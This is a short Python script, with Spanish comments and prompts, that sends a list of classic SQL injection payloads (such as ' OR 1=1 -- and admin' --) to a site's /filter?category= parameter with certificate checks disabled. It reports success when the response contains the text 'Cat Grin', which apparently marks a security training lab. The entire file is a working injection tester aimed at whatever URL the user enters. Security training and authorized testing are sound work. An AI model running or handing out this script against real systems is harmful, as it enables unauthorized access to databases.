import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# No usar proxy
proxies = {}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    # Realizar la solicitud sin especificar proxies
    r = requests.get(url + uri + payload, verify=False)
    if "Cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = input("Ingrese la URL de su sitio web: ").strip()

        payloads = [
            "1=1",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' OR 1 --",
            "' OR '1'='1' --",
            "' OR '1'='1' ({",
            "' OR '' = '",
            "' OR 1=1 #",
            "admin' --"
        ]

        successful_payloads = []

        for payload in payloads:
            if exploit_sqli(url, payload):
                print(f"[+] SQL injection successful with payload: {payload}")
                successful_payloads.append(payload)
            else:
                print(f"[-] SQL injection unsuccessful with payload: {payload}")

        if successful_payloads:
            print(f"[+] Successful payloads: {successful_payloads}")
        else:
            print("[-] No successful SQL injection payloads found.")

    except Exception as e:
        print(f"[-] An error occurred: {e}")
        sys.exit(-1)

